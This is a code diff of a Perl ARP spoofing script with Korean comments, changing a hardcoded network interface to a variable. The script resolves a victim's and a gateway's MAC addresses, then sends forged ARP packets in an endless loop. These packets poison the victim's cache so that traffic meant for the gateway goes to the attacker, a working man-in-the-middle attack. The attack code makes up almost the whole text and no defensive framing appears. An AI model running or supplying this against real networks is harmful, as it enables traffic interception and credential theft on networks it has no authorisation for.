@@ -25,19 +25,19 @@ my $victim_ip= shift @ARGV;
 print "victim ip: $victim_ip\n";
 
 #ARP request packet 보내고 victim mac 얻어오기
-Net::ARP::send_packet('ens33',$my_ip,$victim_ip,$my_mac,"00:00:00:00:00:00",'request'); 
-my $victim_mac=Net::ARP::arp_lookup('ens33',$victim_ip);
+Net::ARP::send_packet($device,$my_ip,$victim_ip,$my_mac,"00:00:00:00:00:00",'request'); 
+my $victim_mac=Net::ARP::arp_lookup($device,$victim_ip);
 print "victim_mac: $victim_mac\n"; 
 
 #ARP request packet 보내고gayeway mac 얻어오기
-Net::ARP::send_packet('ens33',$my_ip,$gateway_ip,$my_mac,"00:00:00:00:00:00",'request'); 
-my $gateway_mac=Net::ARP::arp_lookup('ens33',$gateway_ip);
+Net::ARP::send_packet($device,$my_ip,$gateway_ip,$my_mac,"00:00:00:00:00:00",'request'); 
+my $gateway_mac=Net::ARP::arp_lookup($device,$gateway_ip);
 print "gateway_mac: $gateway_mac\n"; 
 
 #attack -> victim (ARP Infection Packet)
 while(1)
 {
-  Net::ARP::send_packet('ens33',$gateway_ip,$victim_ip,$my_mac,$victim_mac,'request'); 
+  Net::ARP::send_packet($device,$gateway_ip,$victim_ip,$my_mac,$victim_mac,'request'); 
 }
 
 
